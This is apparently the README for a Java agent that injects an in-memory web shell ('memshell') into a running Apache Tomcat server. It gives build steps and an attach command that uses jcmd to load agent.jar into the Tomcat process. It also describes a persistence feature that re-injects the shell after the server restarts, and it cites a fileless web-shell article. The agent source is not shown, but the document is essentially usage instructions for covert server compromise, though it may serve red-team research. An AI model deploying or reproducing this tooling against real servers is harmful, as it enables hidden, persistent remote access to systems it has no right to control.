## Tested Environment
```bash
$ mvn -version                 
Apache Maven 3.8.7
Maven home: /usr/share/maven
Java version: 17.0.16, vendor: Ubuntu, runtime: /usr/lib/jvm/java-17-openjdk-amd64
Default locale: en, platform encoding: UTF-8
...
```
```bash
$ ./bin/catalina.sh version             
Using CATALINA_BASE:   /opt/tomcat/apache-tomcat-11.0.11
Using CATALINA_HOME:   /opt/tomcat/apache-tomcat-11.0.11
Using CATALINA_TMPDIR: /opt/tomcat/apache-tomcat-11.0.11/temp
Using JRE_HOME:        /usr
Using CLASSPATH:       /opt/tomcat/apache-tomcat-11.0.11/bin/bootstrap.jar:/opt/tomcat/apache-tomcat-11.0.11/bin/tomcat-juli.jar
Using CATALINA_OPTS:   
Server version: Apache Tomcat/11.0.11
...
```

## How to Use
Prepare the attach helper and agent.jar
```bash
$ javac Attach.java
$ mvn clean package -DskipTests
```
```bash
$ mv Attach.class /tmp/Attach.class
$ mv ./target/agent.jar /tmp/agent.jar
```

> [!Important]
>
> Confirm the tomcat service has setup, send a request to load target class

Attach agent.jar to tomcat 
```bash
$ bash -lc "cd /tmp && java --add-modules jdk.attach Attach $(jcmd | grep -E 'catalina' | awk '{print $1}') /tmp/agent.jar"
```

## Persistence
The agent implements simple persistence feature in `AgentEntry.persist()`
1. shutdown the injected tomcat service and restart a new one immediately
2. access the new tomcat service once (`curl localhost:8080`)
3. wait a few seconds, the memshell will be injected again

> [!Note]
> 
> Current implementation still relies on storing agent.jar & Attach helper in filesystem. A proper implementation requires loading those files into memory

## Note
Must access tomcat (run `curl localhost:8080`) once before attach the agent, otherwise the ApplicationFilterChain class may not be loaded

make sure there's no other tomcat running on your testing environment :)


## References
[利用“进程注入”实现无文件复活 WebShell](https://www.freebuf.com/articles/web/172753.html)
